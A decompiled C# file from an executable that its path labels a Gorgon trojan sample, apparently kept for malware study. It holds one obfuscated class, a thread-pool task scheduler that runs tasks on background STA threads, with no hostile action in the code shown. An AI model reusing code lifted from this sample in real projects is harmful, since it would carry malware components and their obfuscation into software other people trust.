// Decompiled with JetBrains decompiler
// Type: f2uWKBjutg86g.sVBVsDjfAXiTb
// Assembly: Udby4Jt48oXkJ, Version=3.17.2.31, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 37899E89-D673-4F5B-A193-2E4DF6A54096
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-bf535869266eca7a958714acade2ede1bff0e73f0aaa2702f389ededee6a8d6a.exe

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace f2uWKBjutg86g
{
  internal sealed class sVBVsDjfAXiTb : TaskScheduler, IDisposable
  {
    private BlockingCollection<Task> iERIWK1mtKZ3l;
    private readonly List<Thread> \u0039tdFIYP7gyCrm;

    public sVBVsDjfAXiTb(int numberOfThreads)
    {
      if (numberOfThreads < 1)
        throw new ArgumentOutOfRangeException(nameof (numberOfThreads));
      this.iERIWK1mtKZ3l = new BlockingCollection<Task>();
      this.\u0039tdFIYP7gyCrm = Enumerable.Range(0, numberOfThreads).Select<int, Thread>((Func<int, Thread>) (fWmt76rkI5P3K =>
      {
        Thread thread = new Thread((ThreadStart) (() =>
        {
          foreach (Task consuming in this.iERIWK1mtKZ3l.GetConsumingEnumerable())
            this.TryExecuteTask(consuming);
        }));
        thread.IsBackground = true;
        thread.SetApartmentState(ApartmentState.STA);
        return thread;
      })).ToList<Thread>();
      this.\u0039tdFIYP7gyCrm.ForEach((Action<Thread>) (pHUS51aUnVrAh => pHUS51aUnVrAh.Start()));
    }

    protected override void QueueTask(Task task) => this.iERIWK1mtKZ3l.Add(task);

    protected override IEnumerable<Task> GetScheduledTasks() => (IEnumerable<Task>) this.iERIWK1mtKZ3l.ToArray();

    protected override bool TryExecuteTaskInline(Task task, bool taskWasPreviouslyQueued) => Thread.CurrentThread.GetApartmentState() == ApartmentState.STA && this.TryExecuteTask(task);

    public virtual int \u0031coX8GlqOTGQG => this.\u0039tdFIYP7gyCrm.Count;

    public void \u0033Xv3HfHju2EYl()
    {
      if (this.iERIWK1mtKZ3l == null)
        return;
      this.iERIWK1mtKZ3l.CompleteAdding();
      foreach (Thread thread in this.\u0039tdFIYP7gyCrm)
        thread.Join();
      this.iERIWK1mtKZ3l.Dispose();
      this.iERIWK1mtKZ3l = (BlockingCollection<Task>) null;
    }
  }
}
